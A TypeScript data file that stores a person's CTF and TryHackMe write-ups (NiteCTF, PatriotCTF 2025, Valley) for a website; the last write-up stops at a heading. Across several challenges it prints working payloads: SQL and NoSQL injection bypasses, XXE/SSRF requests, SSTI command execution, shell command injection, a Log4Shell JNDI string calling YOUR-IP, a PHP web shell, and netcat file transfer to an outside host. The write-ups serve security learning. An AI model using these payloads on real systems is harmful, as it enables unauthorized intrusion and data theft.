export interface WriteupSection {
  type: "heading" | "subheading" | "text" | "code" | "flag" | "list" | "image" | "callout";
  content: string;
  items?: string[];
  alt?: string;
}

export interface WriteupData {
  title: string;
  meta: string;
  slug: string;
  baseImageUrl?: string;
  sections: WriteupSection[];
}

export const writeups: Record<string, WriteupData> = {
  "graph-grief": {
    title: "Graph Grief",
    meta: "NiteCTF • Web • syndro • 6 solves",
    slug: "graph-grief",
    baseImageUrl: "/CTF/Nite2025/",
    sections: [
      { type: "heading", content: "0. Description" },
      { type: "image", content: "Pic/0.png", alt: "Description" },
      { type: "heading", content: "1. Initial Access and Observations" },
      { type: "text", content: "Upon accessing the target, we are presented with AetherCorp's landing page showcasing their \"Hyper-Graph Technology\" API. The page prominently features GraphQL syntax in its demo code blocks and marketing copy, directly comparing their solution to traditional REST APIs." },
      { type: "image", content: "Pic/1.png", alt: "AetherCorp landing page with GraphQL demos" },
      { type: "text", content: "Key observation: The page explicitly states \"Traditional REST APIs are linear,\" highlighting the limitation of requiring multiple sequential requests to fetch related data." },
      { type: "image", content: "Pic/2.png", alt: "REST limitations highlighted on the landing page" },
      { type: "text", content: "The REST vs GraphQL Difference — With traditional REST APIs, accessing nested resources requires chained requests:" },
      { type: "code", content: "GET /books/1                # First, get the book\nGET /authors/1              # Then, get the author separately" },
      { type: "text", content: "GraphQL solves this efficiently with a single query:" },
      { type: "code", content: "query {\n  book(id: \"1\") {\n    title\n    author {\n      firstName\n      lastName\n    }\n  }\n}" },
      { type: "text", content: "Returning to the challenge: The name \"Graph Grief,\" combined with the visible API and GraphQL-like sample queries on the frontend, strongly suggests we are dealing with a GraphQL endpoint." },
      { type: "heading", content: "2. Discovering the GraphQL Endpoint" },
      { type: "text", content: "We begin enumerating common GraphQL paths:" },
      { type: "code", content: "/v1/explorer\n/v1/graphiql\n/graph\n/graphql\n/graphql/console\n/graphql.php\n/graphiql\n/graphiql.php" },
      { type: "text", content: "We successfully locate the functional endpoint at /graphql. This marks the beginning of the real challenge." },
      { type: "image", content: "Pic/3.png", alt: "GraphQL endpoint discovered at /graphql" },
      { type: "text", content: "I opted to use ZAP for interacting with the endpoint, manually modifying the request body — I find this faster and more flexible." },
      { type: "image", content: "Pic/4.png", alt: "Interacting with GraphQL via ZAP" },
      { type: "heading", content: "3. Introspection Attempt" },
      { type: "text", content: "With direct access to the GraphQL interface, the first step is to reveal the full schema via introspection." },
      { type: "image", content: "Pic/5.png", alt: "Attempting standard introspection" },
      { type: "text", content: "Introspection is disabled — queries for __schema or __type fail. However, the error message is quite revealing:" },
      { type: "code", content: "\"Field \\\"__schema\\\" of type \\\"__Schema!\\\" must have a selection of subfields. Did you mean \\\"__schema { ... }\\\"?\"" },
      { type: "text", content: "There are two viable approaches from here:" },
      { type: "list", content: "", items: [
        "Blind schema guessing using a GraphQL wordlist (highly recommended).",
        "Leveraging an alternative vulnerability path (the one I followed)."
      ]},
      { type: "heading", content: "4. Pivoting to XML Content Type" },
      { type: "text", content: "The landing page contains subtle but critical hints:" },
      { type: "image", content: "Pic/7.png", alt: "Developer notes on the landing page" },
      { type: "code", content: "Full support for application/json and application/xml\nDetailed error messages that definitely don't leak stack traces\nDeveloper Note: Legacy XML importer may trigger internal file utilities." },
      { type: "text", content: "We switch to XML by setting Content-Type: application/xml and test basic entity expansion:" },
      { type: "code", content: "<?xml version=\"1.0\" ?>\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n<userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n</userInfo>" },
      { type: "text", content: "The entity is reflected successfully — XML processing is active and vulnerable to entity injection." },
      { type: "image", content: "Pic/8.png", alt: "Successful basic XXE entity reflection" },
      { type: "heading", content: "5. Exploring XXE Capabilities" },
      { type: "text", content: "Attempting to read local files directly proves unsuccessful — general entities (file://) are blocked." },
      { type: "image", content: "Pic/9.png", alt: "General entities blocked" },
      { type: "text", content: "The hints \"Legacy XML\" and the era around 1999 point toward SOAP (Simple Object Access Protocol). We craft a SOAP-style payload to probe internal services." },
      { type: "image", content: "Pic/10.png", alt: "Initial SOAP payload attempt" },
      { type: "text", content: "To bypass potential localhost filters, we use the decimal representation of 127.0.0.1: 2130706433. Testing common ports (8080, 5432, 3000, 8000, 4200), we get a response on port 8000." },
      { type: "image", content: "Pic/12.png", alt: "Connection established to internal service on port 8000" },
      { type: "heading", content: "6. Leaking the GraphQL Schema" },
      { type: "text", content: "We enumerate deeper paths and discover /internal/file." },
      { type: "image", content: "Pic/13.png", alt: "Path enumeration" },
      { type: "image", content: "Pic/Dev.png", alt: "Developer note" },
      { type: "text", content: "Final payload:" },
      { type: "code", content: "<soap:Body>\n<!ENTITY % dtd SYSTEM \"http://2130706433:8000/internal/file?name=schema.graphql\">\n%dtd;\n</soap:Body>" },
      { type: "image", content: "Pic/14.png", alt: "Schema successfully leaked" },
      { type: "text", content: "The leaked schema reveals a secret type with id, hint, flag, and level fields — implementing the Node interface." },
      { type: "code", content: "type secret implements Node {\n  id: ID!\n  hint: String\n  flag: String\n  level: String\n}\n\ntype Query {\n  about: String\n  products: [Product]\n  users: [User]\n  profiles: [Profile]\n  orders: [Order]\n  auditLogs: [AuditLog]\n  node(id: ID!): Node\n}" },
      { type: "heading", content: "7. Accessing the Secret Node" },
      { type: "text", content: "Dumping auditLogs reveals a reference to secret:flag. All IDs are Base64-encoded." },
      { type: "code", content: "{\n  \"query\" : \"query {auditLogs {id action actorId targetNodeId timestamp details}}\"\n}" },
      { type: "image", content: "Pic/15.png", alt: "Audit logs revealing secret node reference" },
      { type: "text", content: "Testing: secret:flag → returns null. But c2VjcmV0OmZsYWc= (Base64 of \"secret:flag\") → returns the object. The flag field is redacted — authorization required." },
      { type: "image", content: "Pic/17.png", alt: "Direct query with raw ID fails" },
      { type: "image", content: "Pic/18.png", alt: "Base64-encoded ID succeeds, but flag is hidden" },
      { type: "image", content: "Pic/19.png", alt: "Re-examining audit logs for clues" },
      { type: "heading", content: "8. Authorization Bypass via Internal Endpoint" },
      { type: "text", content: "Since we already reach an internal service on port 8000, we proxy our query through the XXE vector:" },
      { type: "code", content: "<soap:Body>\n<!ENTITY % dtd SYSTEM \"http://2130706433:8000/internal/graphql?query=query{node(id:%22c2VjcmV0OmZsYWc=%22){__typename ...on secret{id hint level flag}}}\">\n%dtd;\n</soap:Body>" },
      { type: "text", content: "And there it is — the flag, unrestricted." },
      { type: "image", content: "Pic/21.png", alt: "Flag retrieved via internal GraphQL endpoint" },
      { type: "flag", content: "nite{REDACTED}" },
      { type: "text", content: "god, i hate this challenge so much." },
    ],
  },
  "database-reincursion": {
    title: "Database Reincursion",
    meta: "NiteCTF • Web • syndro",
    slug: "database-reincursion",
    baseImageUrl: "/CTF/Nite2025/",
    sections: [
      { type: "heading", content: "0. Challenge Description" },
      { type: "text", content: "A classic case of intern-level security oversights." },
      { type: "image", content: "1.png", alt: "Description" },
      { type: "heading", content: "1. Login Page" },
      { type: "text", content: "Upon accessing the site, we are presented with a login form." },
      { type: "image", content: "2.png", alt: "Login page" },
      { type: "text", content: "A standard SQL injection attempt like ' OR 1=1-- is immediately blocked by a filter." },
      { type: "image", content: "3.png", alt: "Filter" },
      { type: "text", content: "After testing several payloads, the following prove effective in bypassing the filter:" },
      { type: "code", content: "' OR 1=1--  -> Blocked\n' OR 1=1/*  -> Blocked\n1' IS NOT '2'/*  -> Works\n'|| Username /*  -> Works" },
      { type: "text", content: "Using either of the last two payloads successfully logs us in." },
      { type: "heading", content: "2. Employees Directory" },
      { type: "text", content: "Once inside, we see a search bar for employees along with a field for an Admin Passcode." },
      { type: "image", content: "4.png", alt: "Dashboard" },
      { type: "text", content: "A helpful note mentions: \"I heard Kiwi from Management has the passcode\"" },
      { type: "image", content: "5.png", alt: "Hint" },
      { type: "text", content: "Searching for \"Kiwi\" alone yields no results." },
      { type: "image", content: "6.png", alt: "Kiwi search" },
      { type: "text", content: "Since the hint specifies \"from Management,\" we combine:" },
      { type: "code", content: "Kiwi' AND Department=\"Management\"/*" },
      { type: "text", content: "This reveals the passcode." },
      { type: "image", content: "7.png", alt: "Passcode" },
      { type: "heading", content: "3. Admin Panel" },
      { type: "image", content: "8.png", alt: "Admin dashboard" },
      { type: "text", content: "At the bottom of the admin page, there's a \"Metadata Registry\" listing database tables — one of which is redacted, strongly suggesting it contains the flag." },
      { type: "text", content: "We can exploit a UNION-based injection to query the metadata table directly:" },
      { type: "code", content: "' UNION SELECT * FROM metadata/*" },
      { type: "image", content: "9.png", alt: "Data tables" },
      { type: "text", content: "This exposes the hidden table name: CITADEL_ARCHIVE_2077." },
      { type: "text", content: "Next, we determine the column count by testing UNION queries:" },
      { type: "code", content: "' UNION SELECT 1 FROM CITADEL_ARCHIVE_2077/*       -> Error\n' UNION SELECT 1,2 FROM CITADEL_ARCHIVE_2077/*     -> Error\n' UNION SELECT 1,2,3 FROM CITADEL_ARCHIVE_2077/*   -> Error\n' UNION SELECT 1,2,3,4 FROM CITADEL_ARCHIVE_2077/* -> Valid\n' UNION SELECT 1,2,3,4,5 FROM CITADEL_ARCHIVE_2077/* -> Error" },
      { type: "image", content: "10.png", alt: "Error column number" },
      { type: "image", content: "11.png", alt: "Correct column number" },
      { type: "text", content: "The table has exactly 4 columns. We dump the contents:" },
      { type: "code", content: "' UNION SELECT *,2,3,4 FROM CITADEL_ARCHIVE_2077/*" },
      { type: "image", content: "12.png", alt: "Flag!" },
      { type: "flag", content: "nite{neVeR_9Onn4_****}" },
      { type: "text", content: "(P.S. The employee names are Cyberpunk references — I both love and hate the author for that.)" },
    ],
  },
  "trust-fall": {
    title: "Trust Fall",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "trust-fall",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much really." },
      { type: "image", content: "Pic/TrustFall/1.png", alt: "Challenge banner" },
      { type: "heading", content: "1. The Login Page" },
      { type: "text", content: "From the get-go, we have zero info — just username & password placeholders." },
      { type: "image", content: "Pic/TrustFall/2.png", alt: "Login screen" },
      { type: "text", content: "Tried classic SQLi to log in as the first user (usually admin) → didn't work. Inspected source, Network tab → both useless." },
      { type: "heading", content: "2. The Dashboard" },
      { type: "text", content: "So I just logged in with the placeholder values." },
      { type: "image", content: "Pic/TrustFall/3.png", alt: "Main dashboard" },
      { type: "text", content: "Welcome page with products and an \"Admin Console\" button — obviously our target. Clicking it → 403 Forbidden." },
      { type: "text", content: "Noticed a signed session cookie. Modifying it is impossible without the secret, so I just deleted the cookie entirely → Admin Console is accessible!" },
      { type: "text", content: "…but it's there just for the UI. Pure UX garbage." },
      { type: "image", content: "Pic/TrustFall/4.png", alt: "Dummy admin source" },
      { type: "heading", content: "3. Checking the APIs/Assets" },
      { type: "text", content: "Network tab shows static files being loaded from /assets/." },
      { type: "image", content: "Pic/TrustFall/5.png", alt: "Assets from IP/assets/ITEM" },
      { type: "text", content: "We can directly access /assets/anything and it works. Tried ffuf on /assets/ → no hidden dirs." },
      { type: "text", content: "Then I looked at the API call for products — same pattern. Maybe the API is also exposed and fuzzable?" },
      { type: "image", content: "Pic/TrustFall/6.png", alt: "Products API call" },
      { type: "heading", content: "4. ZAP Directory Fuzzing" },
      { type: "text", content: "Used an API endpoint wordlist. Set up ZAP fuzzer — select \"products\" → Add → Strings → Paste payload." },
      { type: "image", content: "Pic/TrustFall/7.png", alt: "ZAP fuzz setup" },
      { type: "text", content: "Any page other than the product page redirects to login. Added a Message Processor tag filter: Regex: Found → Tag: Bad." },
      { type: "image", content: "Pic/TrustFall/8.png", alt: "Filter out /login redirects" },
      { type: "text", content: "Found /users endpoint!" },
      { type: "image", content: "Pic/TrustFall/9.png", alt: "Found /users endpoint" },
      { type: "heading", content: "5. THE FLAG" },
      { type: "text", content: "/users exists! Trying /users/1, /users/2 → normal users." },
      { type: "image", content: "Pic/TrustFall/11.png", alt: "Invalid ID message" },
      { type: "text", content: "But /users/0 is usually the root/admin user. So we try it and there it is!" },
      { type: "image", content: "Pic/TrustFall/12.png", alt: "Flag at user 0" },
      { type: "flag", content: "PCTF{auth_****}" },
      { type: "text", content: "Well, could've been easier if we just guessed \"users\" API lol" },
    ],
  },
  "trust-vault": {
    title: "Trust Vault",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "trust-vault",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The description gives us hints: Jinja2 template + vulnerable SQL query → SQLi into SSTI payload." },
      { type: "image", content: "Pic/Trustvault/1.png", alt: "Challenge description" },
      { type: "heading", content: "1. The Challenge Page" },
      { type: "text", content: "Register → login → dashboard with four tabs. Only Bookmarks is useful." },
      { type: "text", content: "Adding \"{{7*7}}\" as a bookmark → reflected as plain text. Not rendered." },
      { type: "image", content: "Pic/Trustvault/2.png", alt: "Plain text reflection" },
      { type: "text", content: "View source on Bookmarks tab → hidden comment:" },
      { type: "code", content: "<!-- <p>Legacy console: <a href=\"/search\">/search</a></p> -->" },
      { type: "text", content: "Visit /search → renders all bookmarks as Jinja2 templates! Test {{7*7}} → 49 → Jinja confirmed." },
      { type: "image", content: "Pic/Trustvault/3.png", alt: "Jinja confirmed" },
      { type: "heading", content: "2. SSTI Embedded inside SQLi" },
      { type: "text", content: "Bookmarks are stored via raw SQL → inject SSTI payload directly into the database." },
      { type: "text", content: "First, let's try to list directories:" },
      { type: "code", content: "' UNION SELECT \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}\" --" },
      { type: "text", content: "Successfully get directories back." },
      { type: "image", content: "Pic/Trustvault/4.png", alt: "ls output" },
      { type: "text", content: "Final lazy payload:" },
      { type: "code", content: "' UNION SELECT \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings * | grep -i pctf{').read() }}\" --" },
      { type: "text", content: "Visit /search → flag printed instantly." },
      { type: "image", content: "Pic/Trustvault/5.png", alt: "Flag revealed" },
      { type: "flag", content: "PCTF{SQLi_****}" },
      { type: "text", content: "SQLi + SSTI." },
    ],
  },
  "connection-tester": {
    title: "Connection Tester",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "connection-tester",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much in the challenge description." },
      { type: "image", content: "Pic/ConnectionTester/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. Login Page – SQL Injection" },
      { type: "text", content: "The challenge starts with a simple login form." },
      { type: "image", content: "Pic/ConnectionTester/2.png", alt: "Login form" },
      { type: "text", content: "Basic SQL Injection:" },
      { type: "code", content: "Username: ' OR 1=1--\nPassword: anything" },
      { type: "text", content: "Resulting Query:" },
      { type: "code", content: "SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';" },
      { type: "text", content: "1=1 is ALWAYS TRUE, so the payload returns true and logs us in as admin. And -- comments everything afterwards." },
      { type: "image", content: "Pic/ConnectionTester/3.png", alt: "Logged in as admin" },
      { type: "heading", content: "2. Dashboard – The Ping Tool" },
      { type: "text", content: "Once logged in, we get a \"Test Connection\" feature that pings any host we enter. Trying 127.0.0.1 returns output → Maybe it's just shell execution on the backend?" },
      { type: "image", content: "Pic/ConnectionTester/4.png", alt: "Ping localhost" },
      { type: "heading", content: "3. Discovering the Injection Point" },
      { type: "text", content: "The backend likely runs: /bin/sh -c \"ping -c user_input\". Normal separators like ; or | are treated as ping arguments. But & and && work!" },
      { type: "text", content: "Commands like ls, pwd, cat are not built-in shell. But we can use echo with command substitution:" },
      { type: "code", content: "echo \"$(command)\"\n# The $ returns the variable of the input inside of it.\n# so echo \"$(ls)\" would return the directory list!" },
      { type: "heading", content: "4. Listing Files" },
      { type: "code", content: "127.0.0.1 & echo \"$(ls)\"" },
      { type: "image", content: "Pic/ConnectionTester/5.png", alt: "Listing files" },
      { type: "text", content: "→ Reveals flag.txt" },
      { type: "heading", content: "5. Reading the Flag" },
      { type: "code", content: "127.0.0.1 & echo \"$(cat flag.txt)\"" },
      { type: "image", content: "Pic/ConnectionTester/6.png", alt: "Flag revealed" },
      { type: "flag", content: "PCTF{C0nnection_****}" },
      { type: "text", content: "Oh well, that was easy." },
    ],
  },
  "feedback-fallout": {
    title: "Feedback Fallout",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "feedback-fallout",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The challenge description mentions an old Java version, which could be an old exploit." },
      { type: "image", content: "Pic/FeedbackFallout/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. The Feedback Page" },
      { type: "text", content: "Nothing other than a simple feedback Textarea. Inspected source and Network tab → nothing useful." },
      { type: "image", content: "Pic/FeedbackFallout/2.png", alt: "Feedback form" },
      { type: "heading", content: "2. Discovering the Vulnerability" },
      { type: "text", content: "Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response." },
      { type: "image", content: "Pic/FeedbackFallout/3.png", alt: "ZAP intercept" },
      { type: "text", content: "\"Logs four\" at the bottom of the feedback page — hint leading to Log4Shell (CVE-2021-44228)." },
      { type: "image", content: "Pic/FeedbackFallout/6.png", alt: "Challenge hint" },
      { type: "text", content: "Tried to get a reverse shell using Marshalsec:" },
      { type: "code", content: "How MarshalSec works:\n1 - You have a netcat listener on your Attacker Machine\n2 - You set up a SimpleHTTPServer (Python)\n3 - You set up an LDAP server using Marshalsec\n4 - You host an old-version Java .class with reverse shell\n5 - You send a JNDI/ldap to access that Exploit.class\n6 - Final Payload: ${jndi:ldap//YOUR-IP:1389/Exploit.class}" },
      { type: "text", content: "JNDI never worked. Tried basic syntax instead:" },
      { type: "code", content: "${java:version}" },
      { type: "image", content: "Pic/FeedbackFallout/4.png", alt: "Java version leaked" },
      { type: "text", content: "Java still leaks info! Since JNDI is disabled, brute-force ${env:KEY}:" },
      { type: "code", content: "Common syntaxes:\n- ${sys:os.name}\n- ${sys:user.name}\n- ${env:PATH}\n- ${env:HOSTNAME}\n- ${java:version}" },
      { type: "heading", content: "3. The Exploit" },
      { type: "text", content: "Quick for-loop to brute-force common env variable names:" },
      { type: "code", content: "for i in Admin admin ADMIN FLAG FLAG_CTF SECRET KEY SECRET_FLAG flag secret; do\n  echo \"Trying \\${env:$i}\"\n  curl -s -X POST http://TARGET:8080/feedback \\\n    -H \"Content-Type: application/x-www-form-urlencoded;charset=UTF-8\" \\\n    -d \"feedback=\\${env:$i}\" | grep -o \"User .*\"\ndone" },
      { type: "image", content: "Pic/FeedbackFallout/5.png", alt: "Flag found" },
      { type: "flag", content: "PCTF{cant_****}" },
      { type: "text", content: "Log4Shell." },
    ],
  },
  "secureauth": {
    title: "SecureAuth™",
    meta: "PatriotCTF 2025 • Web • syndro",
    slug: "secureauth",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "There is not much in challenge description." },
      { type: "image", content: "Pic/SecureAuth/1.png", alt: "SecureAuth banner" },
      { type: "heading", content: "1. Initial Login Page" },
      { type: "text", content: "We're greeted by a JSON-based login form. Content-Type: application/json — AKA, NoSQL Injection." },
      { type: "image", content: "Pic/SecureAuth/7.png", alt: "Login page" },
      { type: "text", content: "Tried the classic NoSQLi payload in the browser:" },
      { type: "code", content: "Username: admin\nPassword: {\"$ne\": null}" },
      { type: "text", content: "→ Didn't work. The payload was being sent as a string." },
      { type: "heading", content: "2. Using Burp/ZAP" },
      { type: "text", content: "Direct access to /api/authenticate gave \"Method Not Allowed\". Switched to POST and added the proper Content-Type header." },
      { type: "image", content: "Pic/SecureAuth/2.png", alt: "Method not allowed" },
      { type: "image", content: "Pic/SecureAuth/3.png", alt: "Fixed request with POST + Content-Type" },
      { type: "heading", content: "3. Crafting the Real Payload" },
      { type: "text", content: "The challenge literally tells us the backend structure. So we send the $ne operator outside the quotes:" },
      { type: "image", content: "Pic/SecureAuth/4.png", alt: "Hint in source" },
      { type: "image", content: "Pic/SecureAuth/5.png", alt: "Final payload in Burp" },
      { type: "heading", content: "4. Profits!" },
      { type: "text", content: "Bypassed authentication and got the flag instantly." },
      { type: "image", content: "Pic/SecureAuth/6.png", alt: "Flag revealed" },
      { type: "heading", content: "5. One-liner with cURL" },
      { type: "code", content: "curl -X POST http://TARGET:5200/api/authenticate \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":{\"$ne\":null},\"remember\":\"false\"}'" },
      { type: "flag", content: "FLAG{py7h0n_****}" },
      { type: "text", content: "\"SecureAuth™\" — yeah, sure." },
    ],
  },
  "reverse-metadata-1": {
    title: "Reverse Metadata Part 1",
    meta: "PatriotCTF 2025 • Misc • syndro",
    slug: "reverse-metadata-1",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "The image description mentions a hidden vulnerability in metadata — we can sneak a PHP code into an image or a .php file and it gets executed." },
      { type: "image", content: "Pic/ReverseMetadataPart1/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. The Upload Form" },
      { type: "text", content: "A very simple image upload page with no client-side filtering in the source code." },
      { type: "image", content: "Pic/ReverseMetadataPart1/2.png", alt: "Upload form" },
      { type: "image", content: "Pic/ReverseMetadataPart1/3.png", alt: "Source code" },
      { type: "text", content: "Uploaded a PHP shell:" },
      { type: "code", content: "<html>\n<body>\n  <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n  <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n  <input type=\"SUBMIT\" value=\"Execute\">\n  </form>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd'] . ' 2>&1');\n    }\n?>\n</body>\n</html>" },
      { type: "heading", content: "2. Uploading a PHP Shell" },
      { type: "text", content: "Upload successful — shell execution works!" },
      { type: "image", content: "Pic/ReverseMetadataPart1/4.png", alt: "Upload success" },
      { type: "image", content: "Pic/ReverseMetadataPart1/5.png", alt: "Shell execution" },
      { type: "heading", content: "3. Finding the Flag" },
      { type: "text", content: "With the shell, we list the directory and read the flag:" },
      { type: "code", content: "ls -la\ncat flag2.txt" },
      { type: "image", content: "Pic/ReverseMetadataPart1/6.png", alt: "Flag captured" },
      { type: "flag", content: "MASONCC{images_****}" },
      { type: "text", content: "Never trust an image upload." },
    ],
  },
  "reverse-metadata-2": {
    title: "Reverse Metadata Part 2",
    meta: "PatriotCTF 2025 • Misc • syndro",
    slug: "reverse-metadata-2",
    baseImageUrl: "/CTF/PatriotCTF2025/",
    sections: [
      { type: "heading", content: "0. The Challenge Description" },
      { type: "text", content: "Pretty much the same as Part 1, but different flag location." },
      { type: "image", content: "Pic/ReverseMetadataPart2/1.png", alt: "Challenge Description" },
      { type: "heading", content: "1. Same Vulnerability, New Location" },
      { type: "text", content: "We upload our PHP shell syndro.php and get instant RCE again." },
      { type: "code", content: "<html>\n<body>\n  <form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n  <input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n  <input type=\"SUBMIT\" value=\"Execute\">\n  </form>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd'] . ' 2>&1');\n    }\n?>\n</body>\n</html>" },
      { type: "heading", content: "2. Exploring the Filesystem" },
      { type: "text", content: "The uploads directory is empty except our shell. Time to break out:" },
      { type: "code", content: "ls -la ../../" },
      { type: "image", content: "Pic/ReverseMetadataPart2/2.png", alt: "Navigating upwards" },
      { type: "image", content: "Pic/ReverseMetadataPart2/3.png", alt: "Found log directory" },
      { type: "heading", content: "3. The Winning Move" },
      { type: "text", content: "Inside processes.log we finally spot the flag:" },
      { type: "code", content: "strings ../../../log/ctf-monitor/processes.log | grep -i \"pctf{\"" },
      { type: "image", content: "Pic/ReverseMetadataPart2/4.png", alt: "Flag found" },
      { type: "flag", content: "PCTF{hidden_****}" },
      { type: "text", content: "Always check logs. They remember everything." },
    ],
  },
  "valley": {
    title: "Valley",
    meta: "TryHackMe • Linux • Easy",
    slug: "valley",
    baseImageUrl: "/labs/Tryhackme/Valley/",
    sections: [
      { type: "heading", content: "Goal" },
      { type: "list", content: "", items: [
        "What is the user flag?",
        "What is the root flag?"
      ]},
      { type: "text", content: "Target: 10.80.184.98" },
      { type: "text", content: "This writeup follows the simplest path: start with full recon, pivot through the web app to get FTP access, extract SSH creds from a PCAP, then escalate to root through a writable Python library used by a root cron job." },
      { type: "image", content: "Pasted image 20260216181134.png", alt: "Initial enumeration screenshot" },

      { type: "heading", content: "1) Recon (Nmap)" },
      { type: "text", content: "First step is always service discovery: identify what's exposed and what's worth enumerating." },
      { type: "code", content: "nmap -sV -r -T4 -Pn -p- -oN nmap1.nmap 10.80.184.98 -v" },
      { type: "image", content: "Pasted image 20260216181740.png", alt: "Nmap results screenshot" },
      { type: "callout", content: "Key findings: 22 (SSH) — likely final access later • 80 (HTTP) — main attack surface for creds / hints • 37370 (FTP on a non-standard port) — probably contains files we need" },

      { type: "heading", content: "2) Web Enumeration (FFUF)" },
      { type: "text", content: "Next, brute-force directories to discover hidden routes and developer leftovers." },
      { type: "code", content: "ffuf -u http://10.80.184.98/FUZZ \\\n-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n-fc 404 -s" },
      { type: "image", content: "Pasted image 20260216182149.png", alt: "FFUF results screenshot" },
      { type: "text", content: "We discover multiple routes. /gallery and /static look normal for the site, while /pricing is interesting because it contains internal files." },
      { type: "image", content: "Pasted image 20260216182248.png", alt: "Pricing directory listing screenshot" },
      { type: "text", content: "note.txt:" },
      { type: "image", content: "Pasted image 20260216182258.png", alt: "note.txt content screenshot" },

      { type: "heading", content: "3) FTP (Anonymous attempt)" },
      { type: "text", content: "FTP is running on port 37370, so we try a basic login first. No luck: it requires credentials." },
      { type: "code", content: "ftp 10.80.184.98 37370" },
      { type: "image", content: "Pasted image 20260216182452.png", alt: "FTP anonymous attempt screenshot" },
      { type: "callout", content: "Pointer: when a service blocks anonymous access, the creds usually come from the web app (hardcoded JS, leaked configs, backups, dev panels)." },

      { type: "heading", content: "4) Deeper Enumeration (static → dev)" },
      { type: "text", content: "With FTP blocked, we keep digging on the website. Eventually we find a clue inside /static that leads to a hidden dev area." },
      { type: "image", content: "Pasted image 20260216183127.png", alt: "Further enumeration screenshot" },
      { type: "text", content: "We spot \"00\" under /static/fuzz:" },
      { type: "image", content: "Pasted image 20260216183159.png", alt: "Static 00 discovery screenshot" },

      { type: "heading", content: "5) Hidden Dev Login (/dev)" },
      { type: "image", content: "Pasted image 20260216183243.png", alt: "/dev login page screenshot" },
      { type: "text", content: "The /dev page is a login portal. Instead of guessing, check the page source. A referenced script (/dev.js) contains the validation logic on the client side, which means credentials can be exposed." },
      { type: "image", content: "Pasted image 20260216183426.png", alt: "dev.js screenshot" },
      { type: "callout", content: "Creds found in dev.js: Username: siemDev • Password: california" },
      { type: "text", content: "After logging in, we get a note — the important hint is: \"Stop reusing credentials\". That's a strong signal to try the same creds on other services (FTP/SSH/etc)." },
      { type: "image", content: "Pasted image 20260216183539.png", alt: "Dev note screenshot" },

      { type: "heading", content: "6) FTP (Authenticated)" },
      { type: "text", content: "Use the dev creds on FTP. It works." },
      { type: "code", content: "ftp 10.80.184.98 37370" },
      { type: "image", content: "Pasted image 20260216183656.png", alt: "FTP login success screenshot" },
      { type: "text", content: "Listing the directory shows three Wireshark capture files (.pcapng). Download them locally and inspect in Wireshark." },
      { type: "image", content: "Pasted image 20260216183833.png", alt: "FTP dir listing screenshot" },
      { type: "code", content: "dir\nget file1.pcapng\nget file2.pcapng\nget file3.pcapng" },

      { type: "heading", content: "7) PCAP Analysis (Wireshark)" },
      { type: "text", content: "Open the captures and focus on credential-bearing traffic. Filtering POST requests is a quick win:" },
      { type: "code", content: "http.request.method == \"POST\"" },
      { type: "image", content: "Pasted image 20260216184147.png", alt: "Wireshark credentials screenshot" },
      { type: "callout", content: "SSH creds recovered from PCAP: Username: valleyDev • Password: ph0t0s1234" },

      { type: "heading", content: "8) SSH (User flag)" },
      { type: "text", content: "Login with the recovered credentials:" },
      { type: "code", content: "ssh valleyDev@10.80.184.98" },
      { type: "image", content: "Pasted image 20260216184409.png", alt: "SSH login / user flag screenshot" },
      { type: "text", content: "At this point, the user flag is available. Next goal: root." },

      { type: "heading", content: "9) Privilege Escalation (Part 1 — valleyAuthenticator)" },
      { type: "text", content: "Basic checks first:" },
      { type: "code", content: "sudo -l\nsudo -i" },
      { type: "text", content: "No sudo permissions, so we enumerate the filesystem manually. In /home, we find a binary: valleyAuthenticator. It prompts for credentials, so we pull it locally and reverse it." },
      { type: "code", content: "# On your local machine:\nnc -lp 1234 > valleyAuthenticator\n\n# On the victim machine:\nnc 192.168.184.65 1234 < valleyAuthenticator" },
      { type: "text", content: "The binary is packed, so unpack it with UPX, then open in Ghidra:" },
      { type: "code", content: "upx -d valleyAuthenticator" },
      { type: "image", content: "Pasted image 20260216190718.png", alt: "Ghidra analysis screenshot" },
      { type: "text", content: "In the decompiled output we find two MD5 hashes (one for username, one for password). Cracking them (e.g., CrackStation) reveals:" },
      { type: "image", content: "Pasted image 20260216190852.png", alt: "Cracked MD5 screenshot" },
      { type: "callout", content: "Cracked creds: Username: valley • Password: liberty123" },
      { type: "text", content: "The authenticator prints \"authenticated\", so the creds are valid somewhere. SSH:" },
      { type: "code", content: "ssh valley@10.80.184.98" },

      { type: "heading", content: "10) Privilege Escalation (Part 2 — Cron + Python hijack)" },
